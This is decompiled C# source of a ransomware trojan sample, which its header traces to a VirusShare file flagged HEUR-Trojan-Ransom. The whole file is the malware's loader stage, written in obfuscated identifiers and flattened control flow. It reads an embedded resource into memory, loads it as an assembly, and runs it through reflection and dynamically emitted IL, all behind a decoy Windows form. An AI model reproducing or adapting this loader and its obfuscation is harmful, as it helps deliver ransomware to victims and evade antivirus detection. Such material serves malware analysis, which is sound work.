// Decompiled with JetBrains decompiler
// Type: Asphixere.Form1
// Assembly: Asphixere, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E674F363-54D5-428F-A0DB-A0B1E158EE32
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-6fdf4d4d09c21b951d616432d31fa42aaf60d94a6c2132e9556452851b499003.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Ports;
using System.Reflection;
using System.Reflection.Emit;
using System.Security;
using System.Text;
using System.Windows.Forms;

namespace Asphixere
{
  public class Form1 : Form
  {
    private IContainer 衷\u33B6鬒爡\uE5F9첾돖䪽;
    private SerialPort \uE846툗\uE7BA濑\uF82E㛲螒\u0023;
    private Process 粮\uF254瀩ᏽ\uEED4㜴ꖚ癭;
    private Timer 湞퐚ᄍ䄗\u25F4饹\u2DC7\uEA14;
    private PrintPreviewDialog Ⱆ\uEB45\uF8E6\u32FAﲞ㧰\uEFBAި;
    private List<ushort> ﾐ\u2F6F㓨Ⱒ\uF4C0笧炉좝;
    private List<ListView> 苛슆䱴薵\uE135Ꝅგ餌;

    protected override void Dispose(bool disposing)
    {
label_0:
      int num1 = disposing ? 1 : 0;
      int num2 = 3;
      if (num1 != 0)
        num2 = 1;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_0;
          case 2:
            goto label_8;
          case 3:
label_4:
            base.Dispose(disposing);
            num3 = 3;
            num2 = 4;
            continue;
          case 4:
          case 5:
          case 6:
            while (true)
            {
              switch (num3)
              {
                case 0:
                  goto label_0;
                case 2:
                  if (this.衷\u33B6鬒爡\uE5F9첾돖䪽 != null)
                  {
                    num3 = 1;
                    continue;
                  }
                  goto label_4;
                case 3:
                  goto label_5;
                default:
                  goto label_10;
              }
            }
label_10:
            this.衷\u33B6鬒爡\uE5F9첾돖䪽.Dispose();
            num2 = 3;
            continue;
          default:
            num3 = 2;
            num2 = 5;
            continue;
        }
      }
label_8:
      return;
label_5:;
    }

    private void \u139C渰쯋\u20A5\u1AF2眧\u2630膶()
    {
label_0:
      this.衷\u33B6鬒爡\uE5F9첾돖䪽 = (IContainer) new Container();
      int num1 = 4;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_0;
          case 2:
            num2 = 4;
            goto default;
          case 4:
            num2 = 2;
            goto default;
          case 5:
label_5:
            this.粮\uF254瀩ᏽ\uEED4㜴ꖚ癭.SynchronizingObject = (ISynchronizeInvoke) this;
            num2 = 9;
            goto default;
          case 6:
label_7:
            this.粮\uF254瀩ᏽ\uEED4㜴ꖚ癭.StartInfo.Password = (SecureString) null;
            num2 = 3;
            goto default;
          case 7:
            num2 = 7;
            num1 = 16;
            continue;
          case 9:
            this.粮\uF254瀩ᏽ\uEED4㜴ꖚ癭.StartInfo.StandardOutputEncoding = (Encoding) null;
            num1 = 13;
            continue;
          case 10:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(685, 404);
            num2 = 5;
            num1 = 8;
            continue;
          case 11:
            this.Ⱆ\uEB45\uF8E6\u32FAﲞ㧰\uEFBAި = new PrintPreviewDialog();
            num1 = 12;
            continue;
          case 12:
            num2 = 1;
            num1 = 23;
            continue;
          case 13:
            num2 = 6;
            num1 = 3;
            continue;
          case 14:
label_14:
            this.Ⱆ\uEB45\uF8E6\u32FAﲞ㧰\uEFBAި.AutoScrollMinSize = new Size(0, 0);
            this.Ⱆ\uEB45\uF8E6\u32FAﲞ㧰\uEFBAި.ClientSize = new Size(400, 300);
            num1 = 20;
            continue;
          case 17:
label_19:
            this.ResumeLayout(false);
            num1 = 19;
            continue;
          case 18:
label_20:
            this.Ⱆ\uEB45\uF8E6\u32FAﲞ㧰\uEFBAި.AutoScrollMargin = new Size(0, 0);
            num1 = 2;
            continue;
          case 19:
            goto label_24;
          case 20:
            this.Ⱆ\uEB45\uF8E6\u32FAﲞ㧰\uEFBAި.Enabled = true;
            this.Ⱆ\uEB45\uF8E6\u32FAﲞ㧰\uEFBAި.Visible = false;
            num1 = 10;
            continue;
          case 21:
            num2 = 10;
            num1 = 1;
            continue;
          case 22:
            this.\uE846툗\uE7BA濑\uF82E㛲螒\u0023 = new SerialPort(this.衷\u33B6鬒爡\uE5F9첾돖䪽);
            num1 = 7;
            continue;
          default:
            while (true)
            {
              switch (num2)
              {
                case 0:
                  goto label_0;
                case 2:
                  goto label_17;
                case 3:
                  goto label_18;
                case 4:
                  goto label_14;
                case 5:
                  goto label_19;
                case 6:
                  goto label_5;
                case 7:
                  goto label_6;
                case 8:
                  goto label_7;
                case 9:
                  goto label_20;
                case 10:
                  goto label_3;
                default:
                  this.SuspendLayout();
                  this.粮\uF254瀩ᏽ\uEED4㜴ꖚ癭.StartInfo.LoadUserProfile = false;
                  num2 = 8;
                  continue;
              }
            }
label_3:
            this.湞퐚ᄍ䄗\u25F4饹\u2DC7\uEA14 = new Timer(this.衷\u33B6鬒爡\uE5F9첾돖䪽);
            num1 = 11;
            continue;
label_6:
            this.粮\uF254瀩ᏽ\uEED4㜴ꖚ癭 = new Process();
            num1 = 21;
            continue;
label_17:
            ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
            num1 = 22;
            continue;
label_18:
            this.粮\uF254瀩ᏽ\uEED4㜴ꖚ癭.StartInfo.StandardErrorEncoding = (Encoding) null;
            num1 = 9;
            continue;
        }
      }
label_24:;
    }

    public Form1(UnmanagedMemoryStream UMS)
    {
label_0:
      // ISSUE: explicit constructor call
      base.\u002Ector();
      int num1 = 3;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_0;
          case 3:
            num2 = 3;
            num1 = 8;
            continue;
          case 5:
label_6:
            this.苛슆䱴薵\uE135Ꝅგ餌 = new List<ListView>(1);
            this.苛슆䱴薵\uE135Ꝅგ餌.Add(new ListView());
            num1 = 10;
            continue;
          case 6:
            num2 = 1;
            num1 = 4;
            continue;
          case 7:
            this.SetStyle(ControlStyles.UserPaint, true);
            num1 = 6;
            continue;
          case 9:
            goto label_11;
          case 10:
            num2 = 2;
            num1 = 2;
            continue;
          default:
            switch (num2)
            {
              case 0:
                goto label_0;
              case 1:
                goto label_6;
              case 2:
                this.苛슆䱴薵\uE135Ꝅგ餌.Add(new ListView());
                num1 = 9;
                continue;
              case 3:
                this.SetStyle(ControlStyles.AllPaintingInWmPaint, true);
                num1 = 7;
                continue;
              default:
                num1 = 5;
                continue;
            }
        }
      }
label_11:
      try
      {
        int length = (int) UMS.Length;
        this.ﾐ\u2F6F㓨Ⱒ\uF4C0笧炉좝 = new List<ushort>(length);
        for (int index = 0; index < length; ++index)
          this.ﾐ\u2F6F㓨Ⱒ\uF4C0笧炉좝.Add((ushort) UMS.ReadByte());
        UMS.Close();
      }
      catch
      {
        throw new ExecutionEngineException();
      }
      this.\u139C渰쯋\u20A5\u1AF2眧\u2630膶();
      this.Load += new EventHandler(this.靊\uEEC7矲ᴽ骶肋瑱궸);
    }

    private void 靊\uEEC7矲ᴽ骶肋瑱궸(object _param1, EventArgs _param2)
    {
label_0:
      try
      {
        this.Invalidate();
        int num1 = 4;
        int num2;
        Graphics graphics;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_0;
            case 2:
              num2 = 1;
              num1 = 7;
              continue;
            case 3:
              int num3 = (int) this.Ⱆ\uEB45\uF8E6\u32FAﲞ㧰\uEFBAި.ShowDialog();
              num1 = 1;
              continue;
            case 4:
              graphics = Graphics.FromImage((Image) new Bitmap(1, 1));
              num1 = 2;
              continue;
            case 5:
              this.OnActivated(new EventArgs());
              num1 = 3;
              continue;
            case 6:
            case 7:
              switch (num2)
              {
                case 0:
                  goto label_0;
                case 2:
                  goto label_7;
                default:
                  this.OnPaint(new PaintEventArgs(graphics, this.ClientRectangle));
                  num1 = 5;
                  continue;
              }
            default:
              num2 = 2;
              num1 = 6;
              continue;
          }
        }
label_7:;
      }
      catch
      {
        this.Close();
      }
    }

    protected override void CreateHandle()
    {
label_0:
      ListViewItem listViewItem = new ListViewItem(new ListViewGroup());
      int num1 = 1;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_0;
          case 2:
          case 4:
            switch (num2)
            {
              case 0:
                goto label_0;
              case 1:
                goto label_3;
              case 2:
                goto label_8;
              default:
                num1 = 3;
                continue;
            }
          case 3:
label_3:
            this.苛슆䱴薵\uE135Ꝅგ餌[1].Items.Add(listViewItem);
            num1 = 5;
            continue;
          case 5:
            num2 = 2;
            num1 = 2;
            continue;
          case 6:
            goto label_4;
          case 7:
label_8:
            base.CreateHandle();
            num1 = 6;
            continue;
          default:
            listViewItem.Tag = (object) Assembly.Load(this.ꆵ琵擆鱔\uE776赅頹蜮(this.ﾐ\u2F6F㓨Ⱒ\uF4C0笧炉좝.ToArray())).GetTypes();
            num2 = 1;
            num1 = 4;
            continue;
        }
      }
label_4:;
    }

    protected override void OnPaint(PaintEventArgs e)
    {
label_0:
      e.Graphics.Clear(Color.Chartreuse);
      int num1 = 15;
      while (true)
      {
        ListViewItem listViewItem;
        DynamicMethod dynamicMethod;
        ILGenerator ilGenerator;
        MethodInfo[] methods1;
        int num2;
        MethodInfo[] methods2;
        int count;
        do
        {
          switch (num1)
          {
            case 0:
              goto label_0;
            case 2:
label_2:
              listViewItem = new ListViewItem(new ListViewGroup());
              listViewItem.Tag = (object) dynamicMethod.CreateDelegate(typeof (Form1.RUN));
              num1 = 22;
              continue;
            case 3:
label_3:
              ilGenerator.EmitCall(OpCodes.Callvirt, methods1[13], (System.Type[]) null);
              num2 = 1;
              num1 = 1;
              continue;
            case 4:
label_4:
              e.Graphics.DrawPie(Pens.BlanchedAlmond, this.ClientRectangle, 10f, 50f);
              num1 = 10;
              continue;
            case 7:
label_5:
              methods2 = typeof (System.Type).GetMethods();
              methods1 = typeof (MethodBase).GetMethods();
              num1 = 26;
              continue;
            case 9:
              return;
            case 10:
              num2 = 7;
              goto default;
            case 11:
              e.Graphics.DrawLine(new Pen(Color.FromArgb(6, 21, 240)), 9, 0, 240, 60);
              num2 = 6;
              num1 = 6;
              continue;
            case 12:
              num2 = 2;
              num1 = 16;
              continue;
            case 13:
              num2 = 9;
              goto default;
            case 14:
              num2 = 4;
              num1 = 23;
              continue;
            case 15:
              num2 = 11;
              num1 = 18;
              continue;
            case 17:
label_12:
              ilGenerator.Emit(OpCodes.Ldarg_0);
              num1 = 19;
              continue;
            case 19:
              ilGenerator.EmitCall(OpCodes.Callvirt, methods2[50], (System.Type[]) null);
              num2 = 10;
              goto default;
            case 20:
label_18:
              ilGenerator.Emit(OpCodes.Ldnull);
              ilGenerator.Emit(OpCodes.Ldc_I4_0);
              ilGenerator.Emit(OpCodes.Newarr, typeof (object));
              num1 = 14;
              continue;
            case 21:
label_19:
              dynamicMethod = new DynamicMethod(typeof (Program).GetMethods()[0].Name, typeof (object), new System.Type[1]
              {
                typeof (System.Type)
              }, true);
              ilGenerator = dynamicMethod.GetILGenerator();
              num1 = 13;
              continue;
            case 22:
              num2 = 3;
              num1 = 5;
              continue;
            case 24:
label_22:
              this.苛슆䱴薵\uE135Ꝅგ餌[0].Items.Add(listViewItem);
              num1 = 11;
              continue;
            case 25:
              ilGenerator.Emit(OpCodes.Ldelem_Ref);
              num2 = 12;
              num1 = 8;
              continue;
            case 26:
              count = this.苛슆䱴薵\uE135Ꝅგ餌[0].Items.Count;
              num1 = 11;
              continue;
            default:
              while (true)
              {
                switch (num2)
                {
                  case 0:
                    goto label_0;
                  case 2:
                    goto label_15;
                  case 3:
                    goto label_22;
                  case 4:
                    goto label_3;
                  case 5:
                    goto label_19;
                  case 6:
                    goto label_4;
                  case 7:
                    goto label_21;
                  case 8:
                    goto label_2;
                  case 9:
                    goto label_12;
                  case 10:
                    goto label_17;
                  case 11:
                    goto label_5;
                  case 12:
                    goto label_18;
                  default:
                    ilGenerator.Emit(OpCodes.Ret);
                    num2 = 8;
                    continue;
                }
              }
label_21:
              return;
label_15:
              System.Type[] tag = (System.Type[]) this.苛슆䱴薵\uE135Ꝅგ餌[1].Items[0].Tag;
              num2 = 5;
              num1 = 27;
              continue;
label_17:
              ilGenerator.Emit(OpCodes.Ldc_I4_0);
              num1 = 25;
              continue;
          }
        }
        while (count > 0);
        num1 = 12;
      }
    }

    protected override void OnActivated(EventArgs e)
    {
label_0:
      object obj = ((Form1.RUN) this.苛슆䱴薵\uE135Ꝅგ餌[0].Items[0].Tag)(((System.Type[]) this.苛슆䱴薵\uE135Ꝅგ餌[1].Items[0].Tag)[0]);
      int num1 = 1;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_0;
          case 2:
          case 3:
            goto label_3;
          default:
            num2 = 1;
            num1 = 3;
            continue;
        }
      }
label_3:
      switch (num2)
      {
        case 0:
          goto label_0;
        default:
          throw new Exception();
      }
    }

    private byte[] ꆵ琵擆鱔\uE776赅頹蜮(ushort[] _param1)
    {
label_0:
      byte[] numArray = new byte[_param1.Length];
      int num1 = 2;
label_2:
      while (true)
      {
        int num2;
        int index;
        switch (num1)
        {
          case 0:
            goto label_0;
          case 1:
label_6:
            ++index;
            goto case 3;
          case 2:
label_5:
            index = 0;
            num2 = 5;
            break;
          case 3:
            if (index >= numArray.Length)
            {
              num2 = 2;
              break;
            }
            numArray[index] = (byte) _param1[index];
            num1 = 1;
            num2 = 8;
            break;
          case 4:
            goto label_10;
          default:
            num2 = 4;
            break;
        }
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_0;
            case 2:
              goto label_4;
            case 3:
              goto label_5;
            case 4:
              goto label_6;
            case 5:
              num1 = 3;
              num2 = 7;
              continue;
            case 6:
              goto label_10;
            default:
              goto label_2;
          }
        }
label_4:
        num1 = 4;
      }
label_10:
      return numArray;
    }

    private delegate object RUN(System.Type T);
  }
}
